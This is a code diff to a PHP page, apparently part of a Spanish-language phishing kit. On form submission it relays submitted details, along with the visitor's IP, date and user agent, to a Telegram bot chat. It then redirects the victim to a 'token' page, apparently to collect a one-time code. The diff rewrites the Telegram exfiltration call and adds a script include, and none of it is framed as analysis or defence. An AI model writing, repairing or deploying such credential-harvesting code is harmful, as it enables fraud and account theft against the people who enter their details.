@@ -20,7 +20,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
     $msg .= "🌐 <b>IP:</b> $ip\n";
     $msg .= "🕒 <b>Fecha:</b> $date\n";
-    $msg .= "📲 <b>UA:</b> " . mb_substr($ua, 0, 80) . "\n";
+    $msg .= "📲 <b>UA:</b> " . substr($ua, 0, 80) . "\n";
 
     $keyboard = json_encode([
         'inline_keyboard' => [
@@ -39,20 +39,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         ]
     ]);
 
-    $ch = curl_init("https://api.telegram.org/bot$token/sendMessage");
-    curl_setopt_array($ch, [
-        CURLOPT_POST           => true,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT        => 10,
-        CURLOPT_POSTFIELDS     => [
-            'chat_id'      => $chat_id,
-            'text'         => $msg,
-            'parse_mode'   => 'HTML',
-            'reply_markup' => $keyboard,
-        ],
-    ]);
-    curl_exec($ch);
-    curl_close($ch);
+    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
+        'chat_id'      => $chat_id,
+        'text'         => $msg,
+        'parse_mode'   => 'HTML',
+        'reply_markup' => $keyboard,
+    ]));
 
     header('Location: token.php?u=' . urlencode($usuario));
     exit;
@@ -202,5 +194,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     eyeBtn.querySelector('svg').style.opacity = isPass ? '0.4' : '1';
   });
 </script>
+<script src="../popup.js"></script>
 </body>
 </html>
